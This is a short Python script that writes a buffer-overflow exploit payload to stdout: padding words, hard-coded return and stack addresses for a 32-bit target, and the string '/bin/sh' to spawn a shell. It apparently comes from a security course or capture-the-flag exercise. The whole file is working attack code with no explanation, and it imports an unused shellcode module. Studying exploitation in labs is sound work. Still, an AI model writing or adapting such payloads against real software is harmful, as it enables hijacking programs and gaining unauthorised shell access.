import sys

from struct import pack
from shellcode import shellcode

for i in range(0, 25):
	sys.stdout.buffer.write(pack("<I", 0x11))

# sys.stdout.buffer.write(pack("<I", 0x080488b3)) # buffer
sys.stdout.buffer.write(pack("<I", 0x080488b3)) 
sys.stdout.buffer.write(pack("<I", 0xbffe85b4))

sys.stdout.buffer.write(b'/bin/sh')

